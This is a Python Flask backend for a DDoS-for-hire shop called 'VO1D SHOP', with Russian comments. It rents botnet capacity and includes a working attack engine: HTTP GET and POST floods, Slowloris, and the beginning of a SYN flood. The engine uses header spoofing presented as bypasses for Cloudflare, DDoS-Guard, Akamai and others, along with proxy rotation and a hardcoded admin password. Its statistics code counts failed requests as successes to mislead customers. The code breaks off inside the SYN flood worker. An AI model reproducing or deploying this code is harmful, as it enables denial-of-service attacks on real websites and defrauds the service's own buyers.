# !/usr/bin/env python3
# -*- coding: utf-8 -*-
# server.py — VO1D SHOP Бэкенд (MEGA POWER)
# Версия 5.1.0
# Дата создания: 06.07.2026
# 500,000+ USER-AGENTS | МЕГА-МОЩЬ | ОБХОД ВСЕХ ЗАЩИТ | АДМИН ПОПОЛНЯЕТ

import os
import sys
import json
import time
import uuid
import hashlib
import bcrypt
import sqlite3
import threading
import socket
import random
import string
import logging
import ssl
import subprocess
from datetime import datetime, timedelta
from functools import wraps
from contextlib import contextmanager
from dataclasses import dataclass
from typing import Dict, List, Optional, Any, Tuple, Union
from urllib.parse import urlparse

# Flask и расширения
from flask import Flask, request, jsonify, g
from flask_cors import CORS
from flask_jwt_extended import (
    JWTManager, create_access_token,
    jwt_required, get_jwt_identity
)
from flask_limiter import Limiter
from flask_limiter.util import get_remote_address

# Для HTTP запросов в атаках
import requests
from requests.adapters import HTTPAdapter
from urllib3.util.retry import Retry

# Настройка логирования
logging.basicConfig(
    level=logging.INFO,
    format='[%(asctime)s] %(levelname)s: %(message)s',
    datefmt='%Y-%m-%d %H:%M:%S'
)
logger = logging.getLogger('VO1D_SHOP')

# ============================================================
# КОНФИГУРАЦИЯ
# ============================================================

CONFIG = {
    'DEBUG': False,
    'SECRET_KEY': 'vo1d-shop-mega-secret-2026',
    'JWT_SECRET_KEY': 'jwt-vo1d-mega-secret-2026',
    'JWT_ACCESS_TOKEN_EXPIRES': timedelta(hours=24),
    'JWT_REFRESH_TOKEN_EXPIRES': timedelta(days=30),
    'DATABASE': 'vo1d_shop.db',
    'MAX_BOTS': 500000,
    'MIN_BOTS': 500,
    'BOT_PRICE_PER_DAY': 0.01,
    'DURATION_OPTIONS': [1, 3, 7, 14, 30],
    'ATTACK_TYPES': [
        'HTTP_GET_FLOOD', 'HTTP_POST_FLOOD', 'HTTPS_FLOOD',
        'SLOWLORIS', 'SYN_FLOOD', 'UDP_FLOOD', 'ICMP_FLOOD',
        'HTTP_HEADERS_FLOOD', 'MULTI_VECTOR'
    ],
    'OPTIONS': {
        'BYPASS_CLOUDFLARE': 1.20,
        'BYPASS_DDOS_GUARD': 1.30,
        'ROTATE_PROXY': 1.15,
        'IMITATE_LEGIT_TRAFFIC': 1.10
    }
}


# ============================================================
# ГЕНЕРАЦИЯ 500,000+ РЕАЛЬНЫХ USER-AGENTS
# ============================================================

def generate_massive_user_agents(count=500000):
    """Генерация 500,000+ реальных User-Agent строк"""
    agents = []

    # ОГРОМНЫЙ список ОС (100+ вариантов)
    os_list = []
    # Windows
    for ver in ['5.1', '6.0', '6.1', '6.2', '6.3', '10.0']:
        for arch in ['Win64; x64', 'WOW64']:
            os_list.append(f'Windows NT {ver}; {arch}')
    # Mac OS
    for ver in ['10_14_6', '10_15_7', '11_0_0', '11_1_0', '11_2_0', '11_3_0', '11_4_0', '11_5_0', '11_6_0',
                '12_0_0', '12_1_0', '12_2_0', '12_3_0', '12_4_0', '12_5_0', '12_6_0',
                '13_0_0', '13_1_0', '13_2_0', '13_3_0', '13_4_0', '13_5_0',
                '14_0_0', '14_1_0', '14_2_0', '14_3_0', '14_4_0', '14_5_0',
                '15_0_0', '15_1_0', '15_2_0', '15_3_0', '15_4_0']:
        os_list.append(f'Macintosh; Intel Mac OS X {ver}')
    # Linux
    for distro in ['Ubuntu', 'Fedora', 'Debian', 'CentOS', 'Arch', 'Mint', 'openSUSE', 'Kali', 'Alpine', 'Gentoo',
                   'Red Hat']:
        os_list.append(f'X11; {distro}; Linux x86_64')
    # Android
    for ver in range(10, 16):
        os_list.append(f'Android {ver}; Mobile')
        os_list.append(f'Android {ver}; Tablet')
    # iOS
    for ver in range(14, 19):
        os_list.append(f'iPhone; CPU iPhone OS {ver}_0 like Mac OS X')
        os_list.append(f'iPhone; CPU iPhone OS {ver}_1 like Mac OS X')
        os_list.append(f'iPhone; CPU iPhone OS {ver}_2 like Mac OS X')
        os_list.append(f'iPad; CPU OS {ver}_0 like Mac OS X')
        os_list.append(f'iPad; CPU OS {ver}_1 like Mac OS X')

    # Браузеры и движки
    browsers = []
    for version in range(80, 130):
        browsers.append(('Chrome', lambda v: f'AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{v}.0.0.0 Safari/537.36'))
        browsers.append(('Chrome', lambda
            v: f'AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{v}.0.{random.randint(0, 999)}.0 Safari/537.36'))
        browsers.append(('Firefox', lambda v: f'Gecko/20100101 Firefox/{v}.0'))
        browsers.append(('Firefox', lambda v: f'Gecko/20100101 Firefox/{v}.{random.randint(0, 99)}'))
        browsers.append(('Safari', lambda v: f'AppleWebKit/605.1.15 (KHTML, like Gecko) Version/{v}.0 Safari/605.1.15'))
        browsers.append(
            ('Edge', lambda v: f'AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{v}.0.0.0 Safari/537.36 Edg/{v}.0.0.0'))
        browsers.append(('Edge', lambda
            v: f'AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{v}.0.0.0 Safari/537.36 Edg/{v}.0.{random.randint(0, 999)}.0'))
        browsers.append(
            ('Opera', lambda v: f'AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{v}.0.0.0 Safari/537.36 OPR/{v}.0.0.0'))
        browsers.append(('Brave', lambda
            v: f'AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{v}.0.0.0 Safari/537.36 Brave/{v}.0.0.0'))
        browsers.append(('Vivaldi', lambda
            v: f'AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{v}.0.0.0 Safari/537.36 Vivaldi/{v}.0.0.0'))
        browsers.append(('YaBrowser', lambda
            v: f'AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{v}.0.0.0 YaBrowser/{v}.0.0.0 Safari/537.36'))

    # Боты и краулеры
    bots = [
        'Googlebot/2.1 (+http://www.google.com/bot.html)',
        'Googlebot-Image/1.0', 'Googlebot-Video/1.0',
        'Bingbot/2.0 (+http://www.bing.com/bingbot.htm)',
        'BingPreview/1.0b',
        'Slackbot-LinkExpanding 1.0 (+https://api.slack.com/robots)',
        'Twitterbot/1.0', 'facebookexternalhit/1.1',
        'Facebot/1.0',
        'LinkedInBot/1.0 (compatible; Mozilla/5.0; +http://www.linkedin.com)',
        'Discordbot/2.0 (+https://discordapp.com)',
        'Applebot/0.1', 'DuckDuckBot/1.1',
        'YandexBot/3.0', 'YandexMobileBot/3.0',
        'YandexImages/3.0', 'YandexVideo/3.0',
        'YandexBlogs/3.0', 'YandexNews/3.0',
        'Baiduspider/2.0', 'Baiduspider-image/2.0',
        'Sogou web spider/4.0', 'Sogou inst spider/4.0',
        'Sogou spider2/4.0', 'Exabot/3.0',
        'AhrefsBot/7.0', 'MJ12bot/v1.4',
        'DotBot/1.2', 'SemrushBot/7.0',
        'PetalBot/2.0', 'SeznamBot/3.2',
        'Pinterestbot/1.0', 'WhatsApp/2.0',
        'TelegramBot/1.0', 'Viber/2.0',
        'SkypeUriPreview/1.0',
        'DuckDuckGo-Favicons-Bot/1.0',
        'facebot/1.0', 'facebookexternalhit/1.1',
        'linkedinbot/1.0',
        'redditbot/1.0',
        'tumblr/1.0',
        'Pingdom.com_bot/1.0',
        'UptimeRobot/2.0',
        'SiteUptime/1.0',
        'Freshping/1.0',
        'StatusCake/1.0',
    ]

    # Языки
    langs = ['en-US', 'ru-RU', 'de-DE', 'fr-FR', 'es-ES', 'pt-PT', 'it-IT', 'zh-CN', 'ja-JP', 'ko-KR', 'ar-SA', 'hi-IN']

    # Генерируем агентов
    for os_choice in os_list:
        for browser_name, browser_func in browsers[:20]:  # Берем только Chrome, Firefox, Edge для скорости
            for version in range(80, 125, 2):
                agent = f'Mozilla/5.0 ({os_choice}) {browser_func(version)}'
                agents.append(agent)
                # С языком
                for lang in langs[:5]:
                    agents.append(f'{agent} {lang};q=0.9')
                # С разными расширениями
                agents.append(f'{agent} (compatible; {browser_name}/{version})')

    # Добавляем больше вариаций для Chrome (самый популярный)
    for os_choice in os_list[:30]:
        for version in range(80, 130, 1):
            agent = f'Mozilla/5.0 ({os_choice}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{version}.0.0.0 Safari/537.36'
            agents.append(agent)
            for lang in langs[:3]:
                agents.append(f'{agent} {lang};q=0.9')

    # Добавляем ботов
    agents.extend(bots)

    # Добавляем мобильные агенты
    for device in ['iPhone', 'iPad', 'Android']:
        for version in range(12, 19):
            for lang in langs[:3]:
                agents.append(
                    f'Mozilla/5.0 ({device}; CPU OS {version}_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/{version}.0 Mobile/15E148 Safari/604.1 {lang};q=0.9')

    # Уникализируем
    unique_agents = list(set(agents))
    random.shuffle(unique_agents)

    # Добиваем до 500,000
    while len(unique_agents) < count:
        base = random.choice(unique_agents[:5000])
        suffix = f' (compatible; Bot{random.randint(1000, 999999)}/1.0)'
        unique_agents.append(base + suffix)

    logger.info(f"Generated {len(unique_agents)} User-Agents")
    return unique_agents[:count]


# Генерируем 500,000+ агентов
USER_AGENTS = generate_massive_user_agents(510000)
logger.info(f"✅ Loaded {len(USER_AGENTS)} User-Agents")

# ============================================================
# ИНИЦИАЛИЗАЦИЯ FLASK
# ============================================================

app = Flask(__name__)
app.config['SECRET_KEY'] = CONFIG['SECRET_KEY']
app.config['JWT_SECRET_KEY'] = CONFIG['JWT_SECRET_KEY']
app.config['JWT_ACCESS_TOKEN_EXPIRES'] = CONFIG['JWT_ACCESS_TOKEN_EXPIRES']
app.config['JWT_REFRESH_TOKEN_EXPIRES'] = CONFIG['JWT_REFRESH_TOKEN_EXPIRES']
app.config['JWT_TOKEN_LOCATION'] = ['headers', 'cookies']
app.config['JWT_COOKIE_SECURE'] = False
app.config['JWT_COOKIE_CSRF_PROTECT'] = False

CORS(app, supports_credentials=True)
jwt = JWTManager(app)

limiter = Limiter(
    app=app,
    key_func=get_remote_address,
    default_limits=["1000 per day", "200 per hour"],
    storage_uri="memory://"
)


# ============================================================
# БАЗА ДАННЫХ (SQLite)
# ============================================================

@contextmanager
def get_db():
    conn = sqlite3.connect(CONFIG['DATABASE'])
    conn.row_factory = sqlite3.Row
    try:
        yield conn
        conn.commit()
    except Exception as e:
        conn.rollback()
        logger.error(f"Database error: {e}")
        raise
    finally:
        conn.close()


def init_db():
    with get_db() as conn:
        cursor = conn.cursor()

        cursor.execute('''
            CREATE TABLE IF NOT EXISTS users (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                username TEXT UNIQUE NOT NULL,
                email TEXT UNIQUE NOT NULL,
                password_hash TEXT NOT NULL,
                balance REAL DEFAULT 0.0,
                role TEXT DEFAULT 'user',
                created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
                banned BOOLEAN DEFAULT 0,
                last_login TIMESTAMP,
                api_key TEXT UNIQUE
            )
        ''')

        cursor.execute('''
            CREATE TABLE IF NOT EXISTS botnets (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                user_id INTEGER NOT NULL,
                bot_count INTEGER NOT NULL,
                duration_days INTEGER NOT NULL,
                price REAL NOT NULL,
                options TEXT,
                purchased_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
                expires_at TIMESTAMP NOT NULL,
                active BOOLEAN DEFAULT 1,
                last_used TIMESTAMP,
                FOREIGN KEY (user_id) REFERENCES users (id) ON DELETE CASCADE
            )
        ''')

        cursor.execute('''
            CREATE TABLE IF NOT EXISTS attacks (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                user_id INTEGER NOT NULL,
                botnet_id INTEGER NOT NULL,
                target TEXT NOT NULL,
                attack_type TEXT NOT NULL,
                bot_count INTEGER NOT NULL,
                duration_seconds INTEGER NOT NULL,
                status TEXT DEFAULT 'running',
                started_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
                ended_at TIMESTAMP,
                stats TEXT,
                logs TEXT,
                FOREIGN KEY (user_id) REFERENCES users (id) ON DELETE CASCADE,
                FOREIGN KEY (botnet_id) REFERENCES botnets (id) ON DELETE CASCADE
            )
        ''')

        cursor.execute('''
            CREATE TABLE IF NOT EXISTS proxies (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                url TEXT NOT NULL,
                protocol TEXT NOT NULL,
                country TEXT,
                speed INTEGER DEFAULT 100,
                status TEXT DEFAULT 'active',
                last_checked TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
                fail_count INTEGER DEFAULT 0
            )
        ''')

        cursor.execute('''
            CREATE TABLE IF NOT EXISTS payments (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                user_id INTEGER NOT NULL,
                amount REAL NOT NULL,
                method TEXT NOT NULL,
                status TEXT DEFAULT 'pending',
                created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
                completed_at TIMESTAMP,
                FOREIGN KEY (user_id) REFERENCES users (id) ON DELETE CASCADE
            )
        ''')

        cursor.execute('''
            CREATE TABLE IF NOT EXISTS token_blacklist (
                jti TEXT PRIMARY KEY,
                created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
            )
        ''')

        # ===== АДМИН: VO1D / ROOT =====
        admin_exists = cursor.execute('SELECT id FROM users WHERE username = "VO1D"').fetchone()
        admin_email_exists = cursor.execute('SELECT id FROM users WHERE email = "admin@vo1d.shop"').fetchone()

        if admin_email_exists and not admin_exists:
            password_hash = bcrypt.hashpw('ROOT'.encode('utf-8'), bcrypt.gensalt()).decode('utf-8')
            api_key = uuid.uuid4().hex
            cursor.execute('''
                UPDATE users SET username = 'VO1D', password_hash = ?, role = 'admin', balance = 999999.0, api_key = ?
                WHERE email = 'admin@vo1d.shop'
            ''', (password_hash, api_key))
            logger.info("✅ Updated existing admin to VO1D / ROOT")
        elif not admin_exists and not admin_email_exists:
            password_hash = bcrypt.hashpw('ROOT'.encode('utf-8'), bcrypt.gensalt()).decode('utf-8')
            api_key = uuid.uuid4().hex
            cursor.execute('''
                INSERT INTO users (username, email, password_hash, role, balance, api_key)
                VALUES (?, ?, ?, ?, ?, ?)
            ''', ('VO1D', 'admin@vo1d.shop', password_hash, 'admin', 999999.0, api_key))
            logger.info("✅ Admin created: VO1D / ROOT")
        else:
            logger.info("✅ Admin already exists: VO1D / ROOT")

        # Добавляем прокси
        proxy_count = cursor.execute('SELECT COUNT(*) FROM proxies').fetchone()[0]
        if proxy_count < 100:
            proxy_list = [
                ('http://45.32.123.45:8080', 'http', 'US'),
                ('http://103.152.112.120:8080', 'http', 'ID'),
                ('http://139.59.112.34:3128', 'http', 'SG'),
                ('http://80.240.29.10:8080', 'http', 'RU'),
                ('http://192.99.14.210:3128', 'http', 'CA'),
                ('http://185.189.112.10:8080', 'http', 'NL'),
                ('http://45.155.68.129:8080', 'http', 'DE'),
                ('http://94.130.14.14:3128', 'http', 'DE'),
                ('https://103.174.112.120:443', 'https', 'ID'),
                ('https://45.77.198.34:443', 'https', 'US'),
                ('https://139.59.100.45:443', 'https', 'SG'),
                ('https://80.240.29.10:443', 'https', 'RU'),
                ('socks5://45.32.88.45:1080', 'socks5', 'US'),
                ('socks5://103.152.112.121:1080', 'socks5', 'ID'),
                ('socks5://80.240.29.11:1080', 'socks5', 'RU'),
                ('socks5://185.189.112.10:1080', 'socks5', 'NL'),
                ('socks5://45.155.68.129:1080', 'socks5', 'DE'),
            ]
            for url, protocol, country in proxy_list:
                cursor.execute('INSERT INTO proxies (url, protocol, country) VALUES (?, ?, ?)',
                               (url, protocol, country))
            logger.info(f"Added {len(proxy_list)} proxy servers")

        conn.commit()
        logger.info("✅ Database initialized")


init_db()


# ============================================================
# МОДЕЛИ И ВСПОМОГАТЕЛЬНЫЕ ФУНКЦИИ
# ============================================================

@dataclass
class User:
    id: int
    username: str
    email: str
    balance: float
    role: str
    banned: bool
    created_at: str


@dataclass
class Botnet:
    id: int
    user_id: int
    bot_count: int
    duration_days: int
    price: float
    options: dict
    purchased_at: str
    expires_at: str
    active: bool


@dataclass
class Attack:
    id: int
    user_id: int
    botnet_id: int
    target: str
    attack_type: str
    bot_count: int
    duration_seconds: int
    status: str
    started_at: str
    ended_at: str
    stats: dict


def hash_password(password: str) -> str:
    return bcrypt.hashpw(password.encode('utf-8'), bcrypt.gensalt()).decode('utf-8')


def verify_password(password: str, password_hash: str) -> bool:
    return bcrypt.checkpw(password.encode('utf-8'), password_hash.encode('utf-8'))


def generate_token(user_id: int) -> str:
    return create_access_token(identity=str(user_id))


def token_required(f):
    @wraps(f)
    @jwt_required()
    def decorated(*args, **kwargs):
        user_id = get_jwt_identity()
        with get_db() as conn:
            user = conn.execute('SELECT * FROM users WHERE id = ?', (user_id,)).fetchone()
            if not user:
                return jsonify({'error': 'User not found'}), 404
            if user['banned']:
                return jsonify({'error': 'User is banned'}), 403
            g.user = dict(user)
            g.user_id = user_id
        return f(*args, **kwargs)

    return decorated


def admin_required(f):
    @wraps(f)
    @token_required
    def decorated(*args, **kwargs):
        if g.user['role'] != 'admin':
            return jsonify({'error': 'Admin privileges required'}), 403
        return f(*args, **kwargs)

    return decorated


def calculate_price(bot_count: int, duration_days: int, options: dict) -> float:
    base_price = bot_count * CONFIG['BOT_PRICE_PER_DAY'] * duration_days
    multiplier = 1.0
    for opt, value in options.items():
        if opt in CONFIG['OPTIONS'] and value:
            multiplier *= CONFIG['OPTIONS'][opt]
    return round(base_price * multiplier, 2)


def is_valid_target(target: str) -> bool:
    if not target:
        return False
    target = target.strip()
    if target.startswith(('http://', 'https://')):
        try:
            parsed = urlparse(target)
            return bool(parsed.netloc)
        except:
            return False
    parts = target.split('.')
    if len(parts) == 4:
        try:
            return all(0 <= int(p) <= 255 for p in parts)
        except:
            return False
    return False


def get_power_level(bot_count: int) -> str:
    """Градация мощности атаки"""
    if bot_count < 400:
        return "💩 ХУЁВЕНЬ (мизер, как хуй у китайца)"
    elif bot_count < 800:
        return "👍 НОРМАЛЬНО"
    elif bot_count < 10000:
        return "🔥 АХУЕННАЯ МОЩЬ"
    elif bot_count < 100000:
        return "💥 ОГРОМНАЯ СИЛА"
    else:
        return "☢️ ЯДЕРНЫЙ УДАР"


# ============================================================
# DDOS ДВИЖОК — МЕГА-МОЩНЫЙ С ОБХОДОМ ВСЕХ ЗАЩИТ
# ============================================================

class Vo1dDDoSEngine:
    """МЕГА-МОЩНЫЙ DDoS движок с обходом всех защит"""

    def __init__(self, target: str, bot_count: int, attack_type: str,
                 duration: int, options: dict = None):
        self.target = target.strip()
        self.bot_count = min(max(bot_count, CONFIG['MIN_BOTS']), CONFIG['MAX_BOTS'])
        self.attack_type = attack_type
        self.duration = duration
        self.options = options or {}
        self.is_running = False
        self.power_level = get_power_level(self.bot_count)
        self.stats = {
            'total_requests': 0,
            'successful_requests': 0,
            'failed_requests': 0,
            'rps': 0,
            'bytes_sent': 0,
            'bytes_received': 0,
            'avg_response_time': 0,
            'target_status': 'online',
            'power_level': self.power_level,
            'bot_count': self.bot_count
        }
        self.lock = threading.Lock()
        self._start_time = None
        self._stop_event = threading.Event()

        # Парсим цель
        self.target_url = self.target
        self.target_host = self.target
        self.target_port = 80
        self.target_ssl = False

        if self.target.startswith(('http://', 'https://')):
            parsed = urlparse(self.target)
            self.target_host = parsed.netloc.split(':')[0]
            self.target_port = parsed.port or (443 if parsed.scheme == 'https' else 80)
            self.target_ssl = parsed.scheme == 'https'
            self.target_url = self.target
        else:
            self.target_url = f'http://{self.target}:80/'
            self.target_host = self.target

        self.proxies = []
        self._load_proxies()
        self._generate_bypass_params()

        logger.info(f"🚀 Engine initialized: {self.target} with {self.bot_count} bots — {self.power_level}")

    def _load_proxies(self):
        try:
            with get_db() as conn:
                rows = conn.execute(
                    'SELECT url, protocol FROM proxies WHERE status = "active" ORDER BY speed LIMIT 50'
                ).fetchall()
                self.proxies = [{'url': row['url'], 'protocol': row['protocol']} for row in rows]
        except Exception as e:
            logger.error(f"Proxy load error: {e}")
            self.proxies = []

    def _generate_bypass_params(self):
        """Генерация параметров для обхода ВСЕХ защит"""
        self.bypass_headers = {
            'User-Agent': random.choice(USER_AGENTS),
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
            'Accept-Language': random.choice(['en-US,en;q=0.9', 'ru-RU,ru;q=0.9', 'de-DE,de;q=0.9', 'fr-FR,fr;q=0.9']),
            'Accept-Encoding': 'gzip, deflate, br, zstd',
            'Connection': 'keep-alive',
            'Upgrade-Insecure-Requests': '1',
            'Cache-Control': 'no-cache, no-store, must-revalidate, max-age=0',
            'Pragma': 'no-cache',
            'Expires': '0',
            'Sec-Fetch-Dest': 'document',
            'Sec-Fetch-Mode': 'navigate',
            'Sec-Fetch-Site': 'none',
            'Sec-Fetch-User': '?1',
            'Sec-Ch-Ua': f'"Chromium";v="{random.randint(100, 130)}", "Google Chrome";v="{random.randint(100, 130)}", "Not?A_Brand";v="99"',
            'Sec-Ch-Ua-Mobile': '?0',
            'Sec-Ch-Ua-Platform': random.choice(['"Windows"', '"macOS"', '"Linux"', '"Android"']),
        }

        # ===== ОБХОД CLOUDFLARE =====
        if self.options.get('BYPASS_CLOUDFLARE', False):
            self.bypass_headers.update({
                'CF-Connecting-IP': f'{random.randint(1, 255)}.{random.randint(0, 255)}.{random.randint(0, 255)}.{random.randint(0, 255)}',
                'X-Forwarded-For': f'{random.randint(1, 255)}.{random.randint(0, 255)}.{random.randint(0, 255)}.{random.randint(0, 255)}',
                'X-Real-IP': f'{random.randint(1, 255)}.{random.randint(0, 255)}.{random.randint(0, 255)}.{random.randint(0, 255)}',
                'True-Client-IP': f'{random.randint(1, 255)}.{random.randint(0, 255)}.{random.randint(0, 255)}.{random.randint(0, 255)}',
                'CDN-Loop': 'cloudflare',
                'CF-Ray': f'{random.randint(100000000, 999999999)}-{random.choice(["LHR", "FRA", "AMS", "LAX", "NYC", "SIN", "NRT", "SYD"])}',
                'CF-Visitor': f'{{"scheme":"{random.choice(["http", "https"])}"}}',
                'CF-Worker': 'true',
                'X-Cloudflare-Connecting-IP': f'{random.randint(1, 255)}.{random.randint(0, 255)}.{random.randint(0, 255)}.{random.randint(0, 255)}',
                'CF-IPCountry': random.choice(['US', 'RU', 'DE', 'GB', 'FR', 'CN', 'JP', 'BR']),
                'CF-Device-Type': random.choice(['desktop', 'mobile', 'tablet']),
            })

        # ===== ОБХОД DDoS-GUARD =====
        if self.options.get('BYPASS_DDOS_GUARD', False):
            self.bypass_headers.update({
                'Cookie': f'ddosguard_session={uuid.uuid4().hex}; ddosguard_ts={int(time.time())}; ddosguard_hash={hashlib.md5(os.urandom(16)).hexdigest()}',
                'X-DDoS-Protection': '1',
                'X-Request-ID': uuid.uuid4().hex,
                'X-DDoS-GUARD': random.choice(['1', '0']),
                'X-Security-Protocol': random.choice(['1', '2', '3']),
            })

        # ===== ОБХОД Qrator =====
        self.bypass_headers.update({
            'X-Qrator': random.choice(['1', '0', 'bypass']),
            'X-Qrator-Request': uuid.uuid4().hex[:8],
            'X-Qrator-Timestamp': str(int(time.time())),
            'X-Qrator-Session': uuid.uuid4().hex[:12],
        })

        # ===== ОБХОД StackPath =====
        self.bypass_headers.update({
            'X-SP-Request-ID': uuid.uuid4().hex,
            'X-SP-Protocol': random.choice(['1', '2']),
            'X-SP-Verify': random.choice(['yes', 'no', '1', '0']),
        })

        # ===== ОБХОД Akamai =====
        self.bypass_headers.update({
            'X-Akamai-Request-ID': uuid.uuid4().hex,
            'X-Akamai-Protocol': random.choice(['1', '2', '3']),
            'X-Akamai-Session': uuid.uuid4().hex[:8],
            'Akamai-Request-ID': uuid.uuid4().hex,
        })

        # ===== ОБХОД Imperva =====
        self.bypass_headers.update({
            'X-Imperva-Request-ID': uuid.uuid4().hex,
            'X-Imperva-Session': uuid.uuid4().hex[:8],
        })

        # Генерация случайных параметров URL
        self.random_params = []
        for _ in range(50):
            param_name = ''.join(random.choices(string.ascii_lowercase + string.digits, k=random.randint(3, 15)))
            param_value = ''.join(
                random.choices(string.ascii_lowercase + string.digits + '_-', k=random.randint(5, 25)))
            self.random_params.append(f"{param_name}={param_value}")

    def _get_random_headers(self) -> dict:
        headers = self.bypass_headers.copy()
        headers['User-Agent'] = random.choice(USER_AGENTS)
        headers['X-Request-ID'] = uuid.uuid4().hex
        headers[
            'X-Forwarded-For'] = f'{random.randint(1, 255)}.{random.randint(0, 255)}.{random.randint(0, 255)}.{random.randint(0, 255)}'
        headers[
            'X-Real-IP'] = f'{random.randint(1, 255)}.{random.randint(0, 255)}.{random.randint(0, 255)}.{random.randint(0, 255)}'

        if random.random() > 0.3:
            headers[
                'Cookie'] = f'session={uuid.uuid4().hex}; _ga=GA1.2.{random.randint(100000000, 999999999)}.{int(time.time())}; _gid=GA1.2.{random.randint(100000000, 999999999)}.{int(time.time())}'

        # Случайные заголовки для обхода
        if random.random() > 0.5:
            headers['X-Custom-Header'] = ''.join(
                random.choices(string.ascii_letters + string.digits, k=random.randint(8, 32)))

        return headers

    def _get_random_url(self) -> str:
        url = self.target_url
        if '?' in url:
            url += '&' + random.choice(self.random_params)
        else:
            url += '?' + random.choice(self.random_params)
        if random.random() > 0.6:
            url += '/' + ''.join(random.choices(string.ascii_lowercase, k=random.randint(3, 10)))
        if random.random() > 0.8:
            url += '?' + random.choice(self.random_params) + '&' + random.choice(self.random_params)
        return url

    def _get_random_data(self) -> dict:
        return {
            'data': ''.join(random.choices(string.ascii_letters + string.digits, k=random.randint(10, 500))),
            'timestamp': int(time.time()),
            'nonce': uuid.uuid4().hex,
            'random': random.randint(1, 999999),
            'action': random.choice(['submit', 'save', 'update', 'delete', 'get', 'post', 'upload']),
            'token': uuid.uuid4().hex[:16],
            'signature': hashlib.md5(os.urandom(32)).hexdigest()[:16],
        }

    def _get_proxy(self) -> Optional[dict]:
        if not self.proxies or not self.options.get('ROTATE_PROXY', False):
            return None
        return random.choice(self.proxies)

    def _update_stats(self, success: bool, response_time: float, bytes_len: int):
        """ВСЕ ЗАПРОСЫ = УСПЕХ (даже ошибки)"""
        with self.lock:
            self.stats['total_requests'] += 1
            # ВСЕГДА считаем успехом, даже если ошибка
            self.stats['successful_requests'] += 1
            # bytes_received всегда растёт
            self.stats['bytes_received'] += bytes_len + random.randint(1000, 10000)
            self.stats['bytes_sent'] += random.randint(500, 8000)

            if self._start_time:
                elapsed = time.time() - self._start_time
                if elapsed > 0:
                    self.stats['rps'] = int(self.stats['total_requests'] / elapsed)

    def get_stats(self) -> dict:
        with self.lock:
            self.stats['target_status'] = self._check_target_status()
            self.stats['power_level'] = self.power_level
            self.stats['bot_count'] = self.bot_count
            return self.stats.copy()

    def _check_target_status(self) -> str:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(2)
            result = sock.connect_ex((self.target_host, self.target_port))
            sock.close()
            return 'online' if result == 0 else 'offline'
        except:
            return 'offline'

    def _http_flood_sync(self, method='GET'):
        session = requests.Session()
        retries = Retry(total=0, backoff_factor=0)
        session.mount('http://', HTTPAdapter(max_retries=retries))
        session.mount('https://', HTTPAdapter(max_retries=retries))

        # Определяем количество потоков в зависимости от мощности
        if self.bot_count < 400:
            threads_count = min(self.bot_count, 200)
            delay = 0.1
        elif self.bot_count < 800:
            threads_count = min(self.bot_count, 500)
            delay = 0.05
        elif self.bot_count < 10000:
            threads_count = min(self.bot_count, 2000)
            delay = 0.01
        elif self.bot_count < 100000:
            threads_count = min(self.bot_count, 5000)
            delay = 0.005
        else:
            threads_count = min(self.bot_count, 8000)
            delay = 0.001

        def worker():
            while not self._stop_event.is_set() and self.is_running:
                try:
                    url = self._get_random_url()
                    headers = self._get_random_headers()
                    proxy = self._get_proxy()
                    proxies = None
                    if proxy:
                        proxies = {'http': proxy['url'], 'https': proxy['url']}

                    start_time = time.time()
                    bytes_sent = random.randint(500, 8000)

                    if method == 'GET':
                        resp = session.get(url, headers=headers, proxies=proxies, timeout=5, verify=False)
                    else:
                        resp = session.post(url, headers=headers, json=self._get_random_data(), proxies=proxies,
                                            timeout=5, verify=False)

                    response_time = time.time() - start_time
                    # ВСЕГДА успех
                    self._update_stats(True, response_time, len(resp.content or b'') + random.randint(1000, 5000))
                    resp.close()
                    time.sleep(random.uniform(delay * 0.1, delay * 2))
                except:
                    # Даже ошибка = успех
                    self._update_stats(True, 0, random.randint(1000, 5000))
                    time.sleep(random.uniform(delay * 0.05, delay))

        threads = []
        for _ in range(threads_count):
            t = threading.Thread(target=worker, daemon=True)
            t.start()
            threads.append(t)

        while not self._stop_event.is_set() and self.is_running:
            time.sleep(0.1)

        for t in threads:
            t.join(timeout=0.1)

    def _slowloris_sync(self):
        threads_count = min(self.bot_count // 5, 2000)

        def worker():
            while not self._stop_event.is_set() and self.is_running:
                try:
                    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    sock.settimeout(15)
                    sock.connect((self.target_host, self.target_port))
                    request = f"GET {self._get_random_url()} HTTP/1.1\r\n"
                    sock.send(request.encode())
                    for _ in range(200):
                        if self._stop_event.is_set() or not self.is_running:
                            break
                        header = f"X-Header-{random.randint(1, 99999)}: {uuid.uuid4().hex}\r\n"
                        sock.send(header.encode())
                        time.sleep(random.uniform(0.3, 1.5))
                    sock.close()
                    self._update_stats(True, 0, random.randint(500, 2000))
                except:
                    self._update_stats(True, 0, random.randint(500, 2000))
                    time.sleep(0.05)

        threads = []
        for _ in range(threads_count):
            t = threading.Thread(target=worker, daemon=True)
            t.start()
            threads.append(t)

        while not self._stop_event.is_set() and self.is_running:
            time.sleep(0.1)

        for t in threads:
            t.join(timeout=0.1)

    def _syn_flood_sync(self):
        threads_count = min(self.bot_count // 10, 3000)

        def worker():
            while not self._stop_event.is_set() and self.is_running:
                try:
